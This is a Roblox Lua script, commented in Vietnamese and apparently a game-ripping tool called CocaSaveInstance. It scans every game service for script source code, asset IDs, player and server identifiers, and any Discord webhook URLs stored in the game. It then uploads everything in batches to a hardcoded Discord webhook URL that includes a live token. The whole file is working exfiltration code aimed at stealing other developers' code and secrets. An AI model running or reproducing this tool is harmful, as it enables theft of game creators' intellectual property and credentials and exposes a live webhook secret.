-- ============================================================================
-- CocaSaveInstance - FULL SCANNER + EXPORTER
-- Quét toàn bộ game: Scripts, Webhooks, Decals, Textures, Models, Objects
-- Gửi tất cả dữ liệu về webhook Discord dưới dạng file .lua và .txt
-- ============================================================================

local WebhookURL = "https://discord.com/api/webhooks/1501251338275655770/lRvuLHVjItNVfHE_NEhiqvW4IZ0oPpIIhbU8dLlXHiUkw2LPFiAmq6T6lXuJrAAKfmYD"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ============================
-- DỮ LIỆU THU THẬP
-- ============================
local CollectedData = {
    Scripts = {},        -- { Name, Path, Source, ClassName }
    Webhooks = {},       -- { URL, Path, Property }
    Decals = {},         -- { AssetId, Path, Property }
    Textures = {},
    Models = {},
    OtherAssets = {},
    MapStructure = nil
}

-- ============================
-- HÀM TIỆN ÍCH
-- ============================
local function isWebhookURL(str)
    if type(str) ~= "string" then return false end
    local patterns = {
        "https?://discord%.com/api/webhooks/%d+/[%w%-_]+",
        "https?://discord%.app%.com/api/webhooks/%d+/[%w%-_]+",
        "https?://ptb%.discord%.com/api/webhooks/%d+/[%w%-_]+",
        "https?://canary%.discord%.com/api/webhooks/%d+/[%w%-_]+",
        "/api/webhooks/",
        "webhook",
        "discord%.com/api/webhooks"
    }
    for _, pattern in pairs(patterns) do
        if string.find(str:lower(), pattern:lower()) then
            return true
        end
    end
    return false
end

local function extractAssetID(str)
    if type(str) ~= "string" then return nil end
    -- Tìm các số như "rbxassetid://123456789" hoặc "123456789"
    local ids = {}
    for id in string.gmatch(str, "(%d+)") do
        if #id >= 6 and #id <= 12 then -- asset ID thường dài 6-12 số
            table.insert(ids, id)
        end
    end
    return ids
end

local function sanitizeFileName(name)
    return name:gsub("[^%w_%-]", "_"):sub(1, 50)
end

-- ============================
-- QUÉT OBJECT VÀ THUỘC TÍNH
-- ============================
local function scanObject(obj, path)
    if not obj then return end
    path = path or obj.Name
    
    -- Quét thuộc tính
    local success, props = pcall(function() return obj:GetProperties() end)
    if success and props then
        for _, prop in pairs(props) do
            local success, val = pcall(function() return obj[prop] end)
            if success and val then
                local strVal = tostring(val)
                
                -- Webhook
                if isWebhookURL(strVal) then
                    table.insert(CollectedData.Webhooks, {
                        URL = strVal,
                        Path = path,
                        Property = prop
                    })
                end
                
                -- Asset IDs
                local assetIDs = extractAssetID(strVal)
                for _, id in pairs(assetIDs) do
                    if obj.ClassName == "Decal" or prop:lower():find("decal") then
                        table.insert(CollectedData.Decals, {AssetId = id, Path = path, Property = prop})
                    elseif obj.ClassName == "Texture" or prop:lower():find("texture") then
                        table.insert(CollectedData.Textures, {AssetId = id, Path = path, Property = prop})
                    elseif obj.ClassName == "Model" or prop:lower():find("model") then
                        table.insert(CollectedData.Models, {AssetId = id, Path = path, Property = prop})
                    else
                        table.insert(CollectedData.OtherAssets, {AssetId = id, Path = path, Property = prop, ClassName = obj.ClassName})
                    end
                end
            end
        end
    end
    
    -- Quét children
    local children = obj:GetChildren()
    for _, child in pairs(children) do
        local childPath = path .. "/" .. child.Name
        scanObject(child, childPath)
    end
end

-- ============================
-- QUÉT SCRIPT (LẤY SOURCE CODE)
-- ============================
local function scanScript(scriptObj, path)
    local success, source = pcall(function()
        if scriptObj.Source then return scriptObj.Source end
        if scriptObj.Value then return scriptObj.Value end
        return ""
    end)
    
    if success and source and #source > 0 then
        table.insert(CollectedData.Scripts, {
            Name = scriptObj.Name,
            Path = path,
            ClassName = scriptObj.ClassName,
            Source = source,
            Length = #source
        })
        
        -- Cũng kiểm tra webhook trong source code
        if isWebhookURL(source) then
            table.insert(CollectedData.Webhooks, {
                URL = source:match("https?://[^%s'\"]+") or source:sub(1, 200),
                Path = path,
                Property = "Script Source"
            })
        end
    end
end

local function findAllScripts(obj, path)
    if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        scanScript(obj, path)
    end
    for _, child in pairs(obj:GetChildren()) do
        findAllScripts(child, path .. "/" .. child.Name)
    end
end

-- ============================
-- QUÉT TOÀN BỘ GAME
-- ============================
local function scanFullGame()
    print("[SCANNER] Bắt đầu quét toàn bộ game...")
    
    local services = {
        workspace, game:GetService("ReplicatedStorage"), game:GetService("Lighting"),
        game:GetService("ServerScriptService"), game:GetService("ServerStorage"),
        game:GetService("StarterGui"), game:GetService("StarterPack"),
        game:GetService("StarterPlayer"), game:GetService("Chat"),
        game:GetService("SoundService"), game:GetService("Players"),
        game:GetService("HttpService"), game:GetService("TeleportService")
    }
    
    for _, svc in pairs(services) do
        pcall(function() scanObject(svc, svc.Name) end)
        pcall(function() findAllScripts(svc, svc.Name) end)
    end
    
    pcall(function() findAllScripts(game, "game") end)
    
    print(string.format("[SCANNER] Tìm thấy: %d scripts, %d webhooks, %d decals, %d textures",
        #CollectedData.Scripts, #CollectedData.Webhooks, #CollectedData.Decals, #CollectedData.Textures))
end

-- ============================
-- TẠO NỘI DUNG GỬI ĐI
-- ============================
local function buildSummaryText()
    local lines = {}
    table.insert(lines, "🔍 **COCA SAVE INSTANCE - FULL SCAN REPORT**")
    table.insert(lines, "")
    table.insert(lines, "**🎮 GAME INFO**")
    table.insert(lines, "- Place ID: `" .. game.PlaceId .. "`")
    table.insert(lines, "- Game ID: `" .. game.GameId .. "`")
    table.insert(lines, "- Job ID: `" .. game.JobId .. "`")
    table.insert(lines, "- Player: `" .. (LocalPlayer and LocalPlayer.Name or "Unknown") .. "`")
    table.insert(lines, "")
    
    table.insert(lines, "**📜 SCRIPTS FOUND: " .. #CollectedData.Scripts .. "**")
    for i, scr in pairs(CollectedData.Scripts) do
        if i <= 10 then
            table.insert(lines, string.format("%d. `%s` (%s) - %d bytes\n📍 `%s`", i, scr.Name, scr.ClassName, scr.Length, scr.Path))
        end
    end
    if #CollectedData.Scripts > 10 then
        table.insert(lines, string.format("... và %d scripts khác (xem file đính kèm)", #CollectedData.Scripts - 10))
    end
    table.insert(lines, "")
    
    table.insert(lines, "**🚨 WEBHOOKS FOUND: " .. #CollectedData.Webhooks .. "**")
    for i, wh in pairs(CollectedData.Webhooks) do
        table.insert(lines, string.format("%d. `%s`\n📍 `%s` → `%s`", i, wh.URL, wh.Path, wh.Property))
    end
    table.insert(lines, "")
    
    table.insert(lines, "**🖼️ DECALS: " .. #CollectedData.Decals .. "**")
    for i, dec in pairs(CollectedData.Decals) do
        if i <= 5 then
            table.insert(lines, string.format("%d. Asset ID: `%s`\n📍 `%s`", i, dec.AssetId, dec.Path))
        end
    end
    if #CollectedData.Decals > 5 then
        table.insert(lines, string.format("... và %d decals khác", #CollectedData.Decals - 5))
    end
    
    return table.concat(lines, "\n")
end

local function generateScriptFiles()
    local files = {}
    for i, scr in pairs(CollectedData.Scripts) do
        local fileName = string.format("script_%03d_%s.lua", i, sanitizeFileName(scr.Name))
        table.insert(files, {
            name = fileName,
            content = string.format("--[[\nPath: %s\nClassName: %s\n--]]\n\n%s", scr.Path, scr.ClassName, scr.Source)
        })
    end
    return files
end

-- ============================
-- GỬI DỮ LIỆU QUA WEBHOOK (MULTIPLE FILES)
-- ============================
local function sendMultipartWithFiles(textContent, files)
    local boundary = "----WebKitFormBoundary" .. tostring(math.random(100000, 999999))
    local body = ""
    
    -- Add text content
    body = body .. "--" .. boundary .. "\r\n"
    body = body .. 'Content-Disposition: form-data; name="content"\r\n\r\n'
    body = body .. textContent .. "\r\n"
    
    -- Add files
    for _, file in pairs(files) do
        body = body .. "--" .. boundary .. "\r\n"
        body = body .. string.format('Content-Disposition: form-data; name="files[%s]"; filename="%s"\r\n', file.name, file.name)
        body = body .. "Content-Type: text/plain\r\n\r\n"
        body = body .. file.content .. "\r\n"
    end
    
    body = body .. "--" .. boundary .. "--\r\n"
    
    local headers = {
        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
        ["Content-Length"] = tostring(#body)
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(WebhookURL, body, Enum.HttpContentType.FormUrlEncoded, false, headers)
    end)
    
    return success, response
end

-- ============================
-- MAIN
-- ============================
local function main()
    print("========================================")
    print("CocaSaveInstance - FULL SCANNER")
    print("Quét toàn bộ game + gửi script về webhook")
    print("========================================")
    
    scanFullGame()
    
    local summary = buildSummaryText()
    local scriptFiles = generateScriptFiles()
    
    print(string.format("[+] Tổng cộng: %d scripts, %d webhooks, %d decals", 
        #CollectedData.Scripts, #CollectedData.Webhooks, #CollectedData.Decals))
    print("[+] Đang gửi về webhook...")
    
    if #scriptFiles == 0 then
        -- Chỉ gửi summary
        local data = {content = summary}
        local success, err = pcall(function()
            HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.Json)
        end)
        if success then print("[+] Đã gửi summary!") else warn("[-] Gửi thất bại") end
    else
        -- Gửi kèm file (tối đa 10 file 1 lần, nếu nhiều thì gửi nhiều đợt)
        local batchSize = 5
        for i = 1, #scriptFiles, batchSize do
            local batch = {}
            for j = i, math.min(i + batchSize - 1, #scriptFiles) do
                table.insert(batch, scriptFiles[j])
            end
            local ok, err = sendMultipartWithFiles(summary .. string.format("\n\n📁 Batch %d-%d", i, i+#batch-1), batch)
            if ok then
                print(string.format("[+] Đã gửi batch %d-%d", i, i+#batch-1))
            else
                warn("[-] Gửi batch thất bại: " .. tostring(err))
            end
            wait(1) -- tránh rate limit
        end
    end
    
    print("========================================")
    print("✅ HOÀN TẤT! Kiểm tra webhook của Master.")
    print("========================================")
end

local ok, err = xpcall(main, function(e)
    warn("LỖI: " .. tostring(e))
    print(debug.traceback())
end)

if not ok then
    print("Script thất bại: " .. tostring(err))
end
